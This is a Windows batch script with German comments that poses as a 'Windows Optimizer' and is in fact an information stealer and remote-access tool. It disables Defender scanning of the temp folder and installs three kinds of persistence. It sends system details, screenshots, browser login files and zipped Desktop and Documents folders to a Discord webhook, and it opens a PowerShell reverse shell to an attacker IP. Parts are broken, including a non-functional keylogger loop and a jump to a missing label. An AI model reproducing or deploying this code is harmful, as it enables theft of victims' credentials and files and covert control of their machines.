@echo off
title Windows Optimizer - Scanning...
color 0a
timeout /t 3 /nobreak >nul

REM Hidden Mode
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%TEMP%'"

REM Temp Folder
mkdir "%TEMP%\opt" >nul 2>&1

REM Persistence (3 Wege)
schtasks /create /tn "WindowsOptimizer" /tr "%~f0" /sc onlogon /rl highest /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Optimizer /t REG_SZ /d "%~f0" /f >nul
echo @%~f0 > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\update.bat"

REM System Info + IP
for /f "tokens=2 delims=:" %%i in ('curl -s ipinfo.io/ip ^| find "ip"') do set IP=%%i
set PC=%computername%-%username%
set OS=Win%ver%

REM Discord WEBHOOK (ersetze deine!)
set WEBHOOK=https://discord.com/api/webhooks/DEIN_WEBHOOK_HIER

REM 1. INFO SCHICKEN
curl -H "Content-Type: application/json" -d "{\"content\":\"🖥️ **NEUES TARGET!** %PC% | IP: %IP% | OS: %OS% | Time: %date% %time%\"}" "%WEBHOOK%" >nul

REM 2. SCREENSHOT
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $b=[Drawing.Bitmap]::new($s.Width,$s.Height); [Drawing.Graphics]::FromImage($b).CopyFromScreen($s.Location, [Drawing.Point]::Empty, $s.Size); $b.Save('%TEMP%\opt\screen.png',[Drawing.Imaging.ImageFormat]::Png); $b.Dispose()" >nul
powershell -Command "[Convert]::ToBase64String([IO.File]::ReadAllBytes('%TEMP%\opt\screen.png'))" > "%TEMP%\opt\base64.txt"
set /p B64=<"%TEMP%\opt\base64.txt"
curl -H "Content-Type: application/json" -d "{\"content\":\"📸 Screenshot\",\"embeds\":[{\"image\":{\"url\":\"data:image/png;base64,%B64%\"}}]}" "%WEBHOOK%" >nul

REM 3. BROWSER PASSWÖRTER (Chrome/Firefox)
powershell -Command "Get-ChildItem '%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data' -EA SilentlyContinue | Out-File '%TEMP%\opt\chrome.txt'"
powershell -Command "Get-ChildItem '%APPDATA%\Mozilla\Firefox\Profiles\*.default-release\logins.json' -EA SilentlyContinue | Out-File '%TEMP%\opt\firefox.txt'"
powershell -Command "Get-Content '%TEMP%\opt\chrome.txt','%TEMP%\opt\firefox.txt' | Out-File '%TEMP%\opt\passwords.txt'"
curl -F "file=@'%TEMP%\opt\passwords.txt'" "%WEBHOOK%" >nul

REM 4. KEYLOGGER (5 Minuten loggen)
echo. > "%TEMP%\opt\keys.log"
powershell -WindowStyle Hidden -Command "while($true){$k=[System.Windows.Forms.SendKeys]::SendWait; $k | Out-File '%TEMP%\opt\keys.log' -Append; Start-Sleep 1}"

REM 5. FILES STEALEN (Desktop/Documents)
xcopy "%USERPROFILE%\Desktop" "%TEMP%\opt\Desktop\" /s /q /y >nul
xcopy "%USERPROFILE%\Documents" "%TEMP%\opt\Documents\" /s /q /y >nul
powershell -Command "Compress-Archive '%TEMP%\opt\Desktop\*','%TEMP%\opt\Documents\*' -DestinationPath '%TEMP%\opt\files.zip' -Force" >nul
curl -F "file=@'%TEMP%\opt\files.zip'" "%WEBHOOK%" >nul

REM 6. REVERSE SHELL (optional - cmd.exe)
powershell -WindowStyle Hidden -Command "while($true){$c=New-Object System.Net.Sockets.TCPClient('DEIN_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$snd=[text.encoding]::ASCII.GetBytes($sb2);$s.Write($snd,0,$snd.Length);$s.Flush()};$c.Close()}"

REM Loop (alle 10min wiederholen)
:loop
timeout /t 600 >nul
goto start

REM Cleanup
:cleanup
rd /s /q "%TEMP%\opt" >nul 2>&1
exit
